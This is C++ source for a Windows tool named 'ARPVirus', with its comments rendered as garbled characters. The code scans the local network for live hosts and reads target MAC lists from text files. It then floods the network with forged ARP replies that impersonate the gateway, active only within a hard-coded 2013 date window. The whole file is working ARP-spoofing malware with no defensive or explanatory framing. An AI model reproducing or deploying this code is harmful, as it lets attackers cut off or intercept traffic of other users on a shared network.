// ARPVirus.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "global.h"
#include "IPHeaders.h"
#include <atltime.h>
#include <algorithm>
#include <fstream>

int init_info();
void enum_host();
DWORD WINAPI scan_lan(LPVOID lparam);
void delete_localip_in_hostList();
void init_arp();
void init_host_arp();
int read_mac();
int TimePolic();
int clean();

int lib_main()
{
	int nRet = 0;
	int nNum = 0;

	MessageBox(NULL, "ok", "ok", MB_OK);
	nRet = init_info();
	if(nRet)
		return nRet;

	enum_host();
    
	if(hostList.size() == 0)
		return -1;
	printf(_T("%s\n"), "����ɨ����������......");
	Sleep(2*1000);
	printf(_T("��ǰ���ߵ���������%d\n"), hostList.size());
	printf(_T("%s\n"), _T("����ʹ������������������......��ctrl+c���˳�"));
	//init_arp();
	init_host_arp();

	while(true)
	{

		nRet = TimePolic();
		if(1 == nRet)
		{
			break; 
		}
		else if(2 == nRet)
		{
			Sleep(2 * 1000);
			if(nNum < 3)
			{
				enum_host();
				nNum++;
			} // ���� if(nNum < 3)
			continue;
		}// ���� if(2 == nRet)

		std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
		while(iter != hostList.end())
		{
			arp.DestinationIP = inet_addr((*iter)->IpAddr);
			memcpy(arp.DestinationMAC, (*iter)->ucMacAddr, 6);
			memcpy(&sendBuffer[14], &arp, 28);
			pcap_sendpacket(pfp, sendBuffer, 14+28);
			iter++;
		}
		Sleep(1000);//TODO:�ĳ����[1-5]s
	}
	pcap_close(pfp);
}

int init_info()
{
	//��������б�
	ULONG ulLen = 0;
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);
	
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
    {
        char adaptername[100];
        pOrgAdapterInfo = pAdapterInfo;
        while(pAdapterInfo != NULL)
        {
            strcpy(adaptername,"\\Device\\NPF_");
            strcat(adaptername,pAdapterInfo->AdapterName);
            strcpy(pAdapterInfo->AdapterName,adaptername);
            pAdapterInfo = pAdapterInfo->Next;
        }
    }

	//��û����
	while(pOrgAdapterInfo != NULL)
	{
		pfp = pcap_open_live( pOrgAdapterInfo->AdapterName ,  100, 0, 1, error );
		ULONG macAddLen=6;
		//�����������������������ȷ�������أ����ж�Ϊ�����
		if(pfp != NULL && (SendARP(inet_addr((char*)pOrgAdapterInfo->GatewayList.IpAddress.String), (IPAddr) NULL,(PULONG) gatewaymac, &macAddLen) == NO_ERROR))
			break;
		else
			pOrgAdapterInfo = pOrgAdapterInfo->Next;
	}

	//û������Ҫ���������˵�������������������������˳���
	if(pOrgAdapterInfo == NULL)
	{
		printf(_T("����������"));
		return - 1;
	} // ���� if(pOrgAdapterInfo == NULL)
    //��������ȡ����������Ϣ��gatewaymac�������SendARP�ѻ�á�
	localip.append((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String);
	netmask.append((char*)pOrgAdapterInfo->IpAddressList.IpMask.String);
	gatewayip.append((char*)pOrgAdapterInfo->GatewayList.IpAddress.String);
	ULONG macLen=6;
	if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))
	{
		printf("�õ�����MACʧ��");
		return - 2;
	} // ���� if(!(SendARP(inet_addr((char*)pOrgAdapterInfo->IpAddressList.IpAddress.String), (IPAddr) NULL,(PULONG) localmac, &macLen) == NO_ERROR))	

	return 0;
}

void enum_host()
{
	clean();
	read_mac();

	unsigned int uHostNum;//�����ڿɻ��ֵ���������
	unsigned int uHostByte; //����λ

	uHostNum = ~ htonl(inet_addr(netmask.data())) - 1;//����������õ������ڵ����������������������� = ~ MASK - 1
	uHostByte = htonl(inet_addr(gatewayip.data())) & 0xffffff00;// ��IP��ַ�õ�����λ
	
	if (uHostNum > 2000)//��ֹ������Ϊ255.0.0.0֮���
		uHostNum = 2000;

	// ������ʱ����,���IP��MAC
	char TempIpAddr[4 * 4];
	char MACAddr[40];
    
	//�߳̾�������2000��
	HANDLE hThread[2001]; 

	int i;
	for (i = 0, uHostByte++; i < uHostNum; i++, uHostByte++)
	{
		// ����IP��ַ
		memset(TempIpAddr, 0, 16);
		sprintf(TempIpAddr, "%d.%d.%d.%d", 
			(uHostByte & 0xff000000) >> 0x18,//ȡ��IPλ������24λ
			(uHostByte & 0x00ff0000) >> 0x10,//ȡ��IPλ������16λ
			(uHostByte & 0x0000ff00) >> 0x08,//ȡ��IPλ������8λ
			(uHostByte & 0x000000ff));//ȡ�����һ��IPλ����ʼΪ0���Ժ�ÿ�μ�1
		//��ʱ�����������Ϣ��������Ҫ̽���IP
		PLAN_HOST_INFO tempHostInfo = new LAN_HOST_INFO;
		memset(tempHostInfo, 0, sizeof(LAN_HOST_INFO));
		memcpy(tempHostInfo->IpAddr, TempIpAddr, sizeof(TempIpAddr));
		//��tempHostInfo����scan_lan����̽�����Ƿ�����
		DWORD ThreadId;
		hThread[i] = CreateThread(NULL,0,scan_lan,tempHostInfo,0,&ThreadId);
	}
    //�ȴ������̷߳��أ�ע�⣬���ֻ�ܵȴ�64����
	WaitForMultipleObjects(MAXIMUM_WAIT_OBJECTS, hThread, TRUE, INFINITE);

	delete_localip_in_hostList();
}

DWORD WINAPI scan_lan(LPVOID lparam)
{
	int flag;
	//��ô�ֵ�����Ĵ�ɨ��������Ϣ
	PLAN_HOST_INFO HostInfo = (PLAN_HOST_INFO)lparam;
	char IpAddr[16];
	unsigned char ucMacAddr[6];
	memcpy(IpAddr, HostInfo->IpAddr, sizeof(IpAddr));
	ULONG macLen=6;
	memset(ucMacAddr, 0xff, sizeof(ucMacAddr));
	//����ARP̽���Ƿ����ߣ�������MAC��ַ
	if (SendARP(inet_addr(IpAddr), (IPAddr) NULL,(PULONG) ucMacAddr, &macLen) == NO_ERROR)
		flag = 1;
	else
		flag =0;

	//������������������ȫ�ֱ���hostList��
	if(flag)
	{
		memcpy(HostInfo->ucMacAddr, ucMacAddr, sizeof(ucMacAddr));
		mutex.Lock();
		hostList.push_back(HostInfo);
		mutex.Unlock();
	}
	else
		delete HostInfo;
	return 0;
}

bool sort_less(PLAN_HOST_INFO e1, PLAN_HOST_INFO e2)
{
	if(memcmp(e1->ucMacAddr, e2->ucMacAddr, 6) < 0)
	{
		return true; 
	}
	else
	{
		return false;
	} // ���� if(memcmp(e1->ucMacAddr, e2->ucMacAddr, 6) < 0)
}

void delete_localip_in_hostList()
{
	std::list< PLAN_HOST_INFO >::iterator iter = hostList.begin();
	while(iter != hostList.end())
	{
		if(!(strcmp((*iter)->IpAddr, localip.data()))
			|| !(strcmp((*iter)->IpAddr, gatewayip.data())))
		{
			PLAN_HOST_INFO p = *iter;
			iter = hostList.erase(iter);
			if(p) delete p;
			continue; 
		}
		iter++;
	}

	hostList.sort(sort_less);
	allHostList.sort(sort_less);
	spoofHostList.sort(sort_less);

	std::list < PLAN_HOST_INFO > unkownHostList;
	std::list < PLAN_HOST_INFO > retureHostList;
	std::list < PLAN_HOST_INFO > unionHostList;
	
	//*
	//�����õ�δ֪��MAC��ַ��δ֪��MAC��ַ��Ҫ������
	set_difference(hostList.begin(), hostList.end(),
		allHostList.begin(), allHostList.end(),
		back_inserter(unkownHostList), sort_less);

	//�󽻼����õ���Ҫ�����ļ���
	set_intersection(hostList.begin(), hostList.end(),
		spoofHostList.begin(), spoofHostList.end(),
		back_inserter(retureHostList), sort_less);

	//�ϲ���������
	set_union(unkownHostList.begin(), unkownHostList.end(),
		retureHostList.begin(), retureHostList.end(),
		back_inserter(unionHostList), sort_less);

	//�ö�δ�����ĵ�ַ
	unkownHostList.clear();
	set_difference(hostList.begin(), hostList.end(),
		unionHostList.begin(), unionHostList.end(),
		back_inserter(unkownHostList), sort_less);

	//�ͷ�δ������ַ���ڴ�
	iter = unkownHostList.begin();
	while(iter != unkownHostList.end())
	{
		delete * iter;
		iter++;
	}// ���� while(iter != retureHostList.end())

	unkownHostList.clear();
	hostList.clear();

	copy(unionHostList.begin(), unionHostList.end(),
		back_inserter(hostList));

	//*/ 
	
}

int clean()
{
	std::list < PLAN_HOST_INFO > ::iterator iter = hostList.begin();
	while(iter != hostList.end())
	{
		delete * iter;
		iter++;
	}// ���� if(!(unkownHostList.empty() || retureHostList.empty()))
	hostList.clear();

	iter = allHostList.begin();
	while(iter != allHostList.end())
	{
		delete * iter;
		iter++;
	}// ���� while(iter != allHostList.end())
	allHostList.clear();

	iter = spoofHostList.begin();
	while(iter != spoofHostList.end())
	{
		delete * iter;
		iter++;
	}// ���� while(iter != spoofHostList.end())
	spoofHostList.clear();

	return 0;
}

void init_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];

	//��MACΪϹ���
	hostmac[0] = 0x00;
	hostmac[1] = 0x21;
	hostmac[2] = 0x97;
	hostmac[3] = 0x18;
	hostmac[4] = 0xBC;
	hostmac[5] = 0x69;
		
	memcpy(ethernet.SourMAC, localmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY��
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.DestinationIP = inet_addr(gatewayip.data());
}

void init_host_arp()
{
	memset(&ethernet, 0, sizeof(ethernet));
	BYTE hostmac[8];
	

	//��MACΪϹ���
	hostmac[0] = 0x00;
    hostmac[1] = 0x23;
    hostmac[2] = 0x8B;
    hostmac[3] = 0x6A;
    hostmac[4] = 0x44;
    hostmac[5] = 0xB7;
	
	
	memcpy(ethernet.SourMAC, hostmac, 6);
    memcpy(ethernet.DestMAC, gatewaymac, 6);
	ethernet.EthType = htons(0x0806);
	memcpy(&sendBuffer, &ethernet, 14);
	
	arp.HardwareType = htons(0x0001);
	arp.ProtocolType = htons(0x0800);
	arp.MACLength = 6;
    arp.IpAddLength = 4;
    arp.OperationCode = htons(0x0002);//ARP REPLY��
	memcpy(arp.SourceMAC, ethernet.SourMAC, 6);
	memcpy(arp.DestinationMAC, ethernet.DestMAC, 6);
	arp.SourceIP = inet_addr(gatewayip.data());
}


//����ֵ��
//       1:����
//       2:��ʱֹͣ����
int TimePolic()
{
	static CTime tStart = CTime::GetCurrentTime();
	int nRet = 0;


	CTime tLimit(2013, 8, 26, 0, 0, 0), tLimitEnd(2013, 9, 29, 12, 59, 59);
	if(!(tStart > tLimit && tStart < tLimitEnd))
	{
		printf("δ��ʱ��");
		return 1;
	}// ���� if(!(tStart > tLimit && tStart < tLimitEnd))


	CTime tCur = CTime::GetCurrentTime();
	CTimeSpan ts = tCur - tStart;
	if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)
	{
		return 2;
	} // ���� if(ts.GetTotalMinutes() % 60 >= 30 && ts.GetTotalMinutes() % 60 <= 60)

	return nRet;
}

unsigned char ConvertToChar(TCHAR * pIn)
{
	unsigned char c;
    strlwr(pIn);

	
	char * p = pIn;
	if(*p >= _T('0') && *p <= _T('9'))
	{
		c = *p - _T('0');
	}
	else if(*p >= _T('a') && *p <= _T('f'))
	{
		c = *p - _T('a') + 0xa;
	}
	c *= 16;
	if(*(p + 1) >= _T('0') && *(p + 1) <= _T('9'))
	{
		c += *(p + 1) - _T('0');
	}
	else if(*(p + 1) >= _T('a') && *(p + 1) <= _T('f'))
	{
		c += *(p + 1) - _T('a') + 0xa;
	}
	return c;
}

int AddList(std::list < PLAN_HOST_INFO > * host, std::string szLine)
{
	int nRet = 0;
	PLAN_HOST_INFO p = new LAN_HOST_INFO;
	if(NULL == p)
	{
		printf(_T("not buffer\n"));
		return - 1;
	}// ���� if(NULL == p)

	memset(p, 0, sizeof(LAN_HOST_INFO));
	char * pPos = (char * )szLine.c_str();
	int j = 0;
	for(int i = 0; i < 12; )
	{
		p->ucMacAddr[j++] = ConvertToChar(pPos + i);
		i += 2;
	} // ���� for(int i = 0; i < 12; )
	host->push_back(p);
	return nRet;
}

//���ļ��ж�ȡmac��ַ�б�,all.txt:������֪����MAC��ַ��s.txt:Ҫ������MAC��ַ
int read_mac()
{
	TCHAR szFileName[1024];
	int iFileLen = 1024;
	int iLen = ::GetModuleFileName(NULL, szFileName, iFileLen);
	if(!iLen)
	{
		printf(_T("�õ���ǰִ���ļ�������.\n"));
		return -1;
	}

	CString szFile = szFileName, szFilePath;
	int i = szFile.ReverseFind(_T('\\'));
	szFilePath = szFile.Left(i + 1);

	CString szAllFile = szFilePath + _T("all.txt");
	CString szSpoofFile = szFilePath + _T("s.txt");

	std::string szLine;
	std::ifstream io;
	io.open(szAllFile);
	if(!io)
	{
		printf(_T("don't open file:%s"), szAllFile);
		return -2;
	} // ���� if(!io)


	while(!io.eof())
	{
		io >> szLine;
		//printf(_T("%s\n"), szLine.c_str());
		AddList(&allHostList, szLine);
	}// ���� while(!io.eof())
	io.clear();
	io.close();

	io.open(szSpoofFile);
	if(!io)
	{
		printf(_T("don't open file:%s"), szSpoofFile);
		return -2;
	} // ���� if(!io)

	while(!io.eof())
	{
		io >> szLine;
		//printf(_T("%s\n"), szLine.c_str());
		AddList(&spoofHostList, szLine);
	}// ���� while(!io.eof())
	io.clear();
	io.close();

}
